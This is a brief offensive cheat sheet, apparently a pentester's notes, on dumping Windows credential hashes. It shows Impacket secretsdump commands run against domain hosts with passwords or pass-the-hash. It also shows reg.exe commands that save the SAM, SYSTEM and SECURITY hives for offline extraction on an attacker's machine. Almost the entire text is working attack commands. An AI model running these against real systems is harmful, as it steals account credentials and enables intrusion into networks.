# Dump Hashes

## Impacket-Secretsdump

```
python3 secretsdump.py <domain.name>/<user>:<password>@<ip> 
python3 secretsdump.py <domain.name>/<user>@ip -hashes <ntlm:ntlm>

impacket-secretsdump backup@spookysec.local # requires password for user
impacket-secretsdump Administrator@10.11.1.1 -hashes 'NTLM:NTLM'
impacket-secretsdump marvel/fcastle:Password1@192.168.183.137
```

## SAM / SYSTEM / SECURITY Hives

We can use the following hives as well to dump the hashes locally. This only requires the transfer of the SYSTEM, SAM, and SECURITY files onto our local machine. We could use whatever file transfer method is the most available to us.

```
reg.exe save hklm\system c:\Users\Administrator\system
reg.exe save hklm\security c:\Users\Administrator\security
reg.exe save hklm\sam c:\Users\Administrator\sam

Transfer them to our attacking machine.

secretsdump.py  -sam sam -system system -security security LOCAL
```
